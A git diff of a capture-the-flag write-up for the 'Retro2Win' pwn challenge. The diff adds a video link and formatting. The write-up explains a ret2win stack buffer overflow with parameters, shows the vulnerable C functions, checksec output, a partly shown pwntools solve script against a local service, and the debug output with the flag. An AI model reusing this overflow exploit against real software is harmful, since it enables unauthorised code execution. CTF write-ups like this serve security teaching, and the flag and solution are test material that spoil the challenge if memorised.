@@ -18,6 +18,10 @@ layout:
 
 # Retro2Win
 
+## Video Walkthrough
+
+[![VIDEO](https://img.youtube.com/vi/Y37KMst1XFU/0.jpg)](https://youtu.be/Y37KMst1XFU "Basic Stack Buffer Overflow (with parameters)")
+
 ## Challenge Description
 
 > So retro.. So winning..
@@ -29,6 +33,7 @@ I'm going to skip over some of the steps, because I cover in more detail in the 
 Anyway, the binary has no canaries and PIE is disabled.
 
 {% code overflow="wrap" %}
+
 ```bash
 checksec --file retro2win
 [*] '/home/crystal/Desktop/challs/pwn/Retro2Win/solution/retro2win'
@@ -38,11 +43,13 @@ checksec --file retro2win
     NX:       NX enabled
     PIE:      No PIE (0x400000)
 ```
+
 {% endcode %}
 
 Here's what the functionality looks like.
 
 {% code overflow="wrap" %}
+
 ```bash
 nc localhost 1338
 *****************************
@@ -81,11 +88,13 @@ Select an option:
 3
 Quitting game...
 ```
+
 {% endcode %}
 
 Nothing! If we disassemble the code, we will find a hidden menu option `1337`.
 
 {% code overflow="wrap" %}
+
 ```bash
 nc localhost 1338
 *****************************
@@ -107,11 +116,13 @@ Checking cheatcode: 1337!
 2. Battle the Dragon
 3. Quit
 ```
+
 {% endcode %}
 
 Nothing will work though, that's because the `enter_cheatcode()` function looks like this.
 
 {% code overflow="wrap" %}
+
 ```c
 void enter_cheatcode()
 {
@@ -122,11 +133,13 @@ void enter_cheatcode()
     printf("Checking cheatcode: %s!\n", code);
 }
 ```
+
 {% endcode %}
 
 Spot the buffer overflow? Yes, but no flag. Check out this other `cheat_mode` function though.
 
 {% code overflow="wrap" %}
+
 ```c
 void cheat_mode(long key1, long key2)
 {
@@ -154,6 +167,7 @@ void cheat_mode(long key1, long key2)
     }
 }
 ```
+
 {% endcode %}
 
 There are no execution paths to this function, so we need to exploit the buffer overflow to redirect the program execution. However, we also need to ensure the correct `key1` and `key2` are provided. Essentially, we have a `ret2win` challenge with parameters. Here's a solve script I put together.
@@ -161,6 +175,7 @@ There are no execution paths to this function, so we need to exploit the buffer 
 ### solve.py
 
 {% code overflow="wrap" %}
+
 ```python
 from pwn import *
 
@@ -225,11 +240,13 @@ io.sendlineafter(b'cheatcode:', payload)
 # Get flag
 io.interactive()
 ```
+
 {% endcode %}
 
 For some reason, it only comes through in the debug. Not sure if this is down to my exploit, the config on the server env (maybe the `socat` command in the dockerfile) or the C code itself. I CBA to debug, you'll work it out! 😅
 
 {% code overflow="wrap" %}
+
 ```bash
 [+] Opening connection to 127.0.0.1 on port 1338: Done
 [DEBUG] Received 0xa8 bytes:
@@ -282,6 +299,7 @@ For some reason, it only comes through in the debug. Not sure if this is down to
     000000f0  7d 0d 0a                                            │}··│
     000000f3
 ```
+
 {% endcode %}
 
 Flag: `INTIGRITI{3v3ry_c7f_n33d5_50m3_50r7_0f_r372w1n}`
